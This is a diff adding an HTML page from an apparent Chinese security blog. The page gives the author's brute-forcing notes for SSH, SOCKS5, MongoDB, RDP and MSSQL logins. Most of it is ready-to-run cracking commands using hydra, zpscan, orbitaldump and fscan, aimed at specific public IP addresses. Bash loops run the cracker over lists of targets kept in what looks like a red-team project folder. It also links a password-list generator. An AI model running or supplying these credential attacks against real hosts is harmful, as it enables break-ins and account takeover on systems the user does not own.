@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>爆破 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7206\u7834", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_2" },
+              {title: "ssh", url: "#ssh" },
+              {title: "socks5", url: "#socks5" },
+              {title: "mongodb", url: "#mongodb" },
+              {title: "RDP", url: "#rdp" },
+              {title: "mssql", url: "#mssql" },
+              {title: "mysql", url: "#mysql" },
+              {title: "Redis", url: "#redis" },
+              {title: "\u5bc6\u7801\u751f\u6210", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/" class="btn btn-xs btn-link">
+        移动端
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%96%B0%E9%A1%B5%E9%9D%A2/%E6%96%B0%E9%A1%B5%E9%9D%A2/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%96%B0%E9%A1%B5%E9%9D%A2/%E6%96%B0%E9%A1%B5%E9%9D%A2/" class="btn btn-xs btn-link">
+        新页面
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">爆破</h1>
+<h2 id="_2">目录</h2>
+<ul>
+<li><a href="#ssh">ssh</a><ul>
+<li><a href="#ssh密码">ssh密码</a></li>
+<li><a href="#fscan">fscan</a></li>
+<li><a href="#orbitaldump">orbitaldump</a></li>
+<li><a href="#hydra">hydra</a></li>
+</ul>
+</li>
+<li><a href="#socks5">socks5</a><ul>
+<li><a href="#hydra">hydra</a></li>
+</ul>
+</li>
+<li><a href="#mongodb">mongodb</a><ul>
+<li><a href="#zpscan">zpscan</a></li>
+<li><a href="#fscan">fscan</a></li>
+</ul>
+</li>
+<li><a href="#RDP">RDP</a><ul>
+<li><a href="#zpscan">zpscan</a></li>
+</ul>
+</li>
+<li><a href="#mssql">mssql</a><ul>
+<li><a href="#zpscan">zpscan</a></li>
+</ul>
+</li>
+<li><a href="#mysql">mysql</a><ul>
+<li><a href="#zpscan">zpscan</a></li>
+</ul>
+</li>
+<li><a href="#Redis">Redis</a><ul>
+<li><a href="#zpscan">zpscan</a></li>
+</ul>
+</li>
+<li><a href="#密码生成">密码生成</a></li>
+</ul>
+<h2 id="ssh">ssh</h2>
+<h3 id="ssh_1">ssh密码</h3>
+<p><a href="https://github.com/NewBee119/ssh-scanner.git" title="https://github.com/NewBee119/ssh-scanner.git">https://github.com/NewBee119/ssh-scanner.git</a></p>
+<h3 id="fscan">fscan</h3>
+<p>fscan是可以手动ssh爆破的，只是效果不太理想</p>
+<pre><code class="language-纯文本">./fscan -m ssh 
+</code></pre>
+<h3 id="orbitaldump">orbitaldump</h3>
+<pre><code class="language-纯文本">pip install -U --user orbitaldump
+python -m orbitaldump
+
+python -m orbitaldump -t 10 -u usernames.txt -p passwords.txt -h example.com --proxies
+
+</code></pre>
+<h3 id="hydra">hydra</h3>
+<p>hydra是爆破神奇，但是爆破ssh需要额外安装模块，有点麻烦。备用</p>
+<h2 id="socks5">socks5</h2>
+<h3 id="hydra_1">hydra</h3>
+<pre><code class="language-纯文本">./hydra -L ~/Documents/security/tools/zidian/username_deafult.txt -P ~/Documents/security/tools/zidian/Top50.txt socks5://116.162.51.88:8001
+</code></pre>
+<h2 id="mongodb">mongodb</h2>
+<h3 id="zpscan">zpscan</h3>
+<pre><code class="language-纯文本">./zpscan_darwin crack -i &quot;180.184.70.193:3717|mongodb&quot;
+</code></pre>
+<p>批量脚本</p>
+<pre><code class="language-纯文本">while IFS= read -r line
+do
+ ./zpscan_darwin crack -i &quot;${line}|mongodb&quot;
+done &lt; &quot;/Users/CONST27/Documents/project/honglan/9.25/mongodb.txt&quot;
+</code></pre>
+<h3 id="fscan_1">fscan</h3>
+<p>不如zpscan+bash脚本</p>
+<h2 id="rdp">RDP</h2>
+<h3 id="zpscan_1">zpscan</h3>
+<pre><code class="language-纯文本">./zpscan_darwin crack -i &quot;180.184.70.193:3389|rdp&quot;
+</code></pre>
+<p>批量脚本</p>
+<pre><code class="language-纯文本">while IFS= read -r line
+do
+ ./zpscan_darwin crack -i &quot;${line}|rdp&quot;
+done &lt; &quot;/Users/CONST27/Documents/project/honglan/9.25/rdp.txt&quot;
+</code></pre>
+<h2 id="mssql">mssql</h2>
+<h3 id="zpscan_2">zpscan</h3>
+<pre><code class="language-纯文本">./zpscan_darwin crack -i &quot;180.184.70.193:1433|mssql&quot;
+</code></pre>
+<pre><code class="language-纯文本">while IFS= read -r line
+do
+ ./zpscan_darwin crack -i &quot;${line}|mssql&quot;
+done &lt; &quot;/Users/CONST27/Documents/project/honglan/9.25/mssql_url.txt&quot;
+</code></pre>
+<h2 id="mysql">mysql</h2>
+<h3 id="zpscan_3">zpscan</h3>
+<h2 id="redis">Redis</h2>
+<h3 id="zpscan_4">zpscan</h3>
+<h2 id="_3">密码生成</h2>
+<p><a href="https://github.com/sry309/PwdBUD.git" title="https://github.com/sry309/PwdBUD.git">https://github.com/sry309/PwdBUD.git</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/" class="btn btn-xs btn-link">
+        移动端
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%96%B0%E9%A1%B5%E9%9D%A2/%E6%96%B0%E9%A1%B5%E9%9D%A2/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%96%B0%E9%A1%B5%E9%9D%A2/%E6%96%B0%E9%A1%B5%E9%9D%A2/" class="btn btn-xs btn-link">
+        新页面
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
